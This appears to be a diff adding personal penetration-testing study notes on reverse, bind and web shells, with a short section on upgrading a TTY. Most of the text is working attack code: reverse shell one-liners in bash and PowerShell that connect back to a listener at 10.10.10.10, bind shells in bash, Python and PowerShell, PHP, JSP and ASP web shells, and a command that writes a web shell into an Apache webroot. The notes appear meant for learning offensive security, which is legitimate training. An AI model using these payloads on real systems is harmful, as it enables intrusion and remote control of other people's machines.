@@ -1,0 +1,93 @@
+Types of Shells:
+
+- Reverse Shell
+  - Connects back to our system and gives us control through a reverse connection.
+  - Quickest and easiest
+  - ID a vuln on remote host that allows RCE and start a netcat listener on machine that listens on a specific port
+    - Execute a reverse shell commnand that connects the remote system shell to netcat listener
+      - Windows or linux system?
+      - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+        -Comprehensive list of reverse shells to cover wide range
+      - Bash commands for linux:
+        bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+
+      - Powershell commands for windows:
+        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+- Bind Shell
+  - Waits for us to connect to it and gives us control once we do.
+  - Will have to connect to it on the targets listening port
+  - Connect to that port with netcat
+  - Can utilize Payload All the Things
+  - Bash commands:
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+
+  - Python:
+    python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+  - Powershell:
+    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+  - Can now utilize our system to connect to the port on victim machine 
+    nc 10.10.10.1 1234
+
+- Web Shell
+  - Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
+  - Web shell scripts
+  - php:
+    <?php system($_REQUEST["cmd"]); ?>
+  - jsp:
+    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+  - asp:
+    <% eval request("cmd") %>
+
+- Uploading a web shell:
+  - Default webroots for common web servers:
+  Apache	/var/www/html/
+  Nginx	  /usr/local/nginx/html/
+  IIS	    c:\inetpub\wwwroot\
+  XAMPP	  C:\xampp\htdocs\
+
+  - Example for attackgin a linux host running Apache
+    echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+
+- Accessing Web Shell:
+
+  - Browser via cURL
+    - curl http://SERVER_IP:PORT/shell.php?cmd=id
+  - Can visit /shell.php?cmd=id
+  
+
+
+Upgrading TTY
+
+- Map terminal TTY with the remote TTY
+
+- python/stty method:
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  - utilize [CTRL+Z] to background our shell and get back on our local terminaly
+  - input stty command
+  stty raw -echo
+  fg
+
+- fg : brings our netcat shell to the foreground.
+- echo $TERM
+- stty size
+- export TERM=xterm-256color
+- stty rows 67 columns 318
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
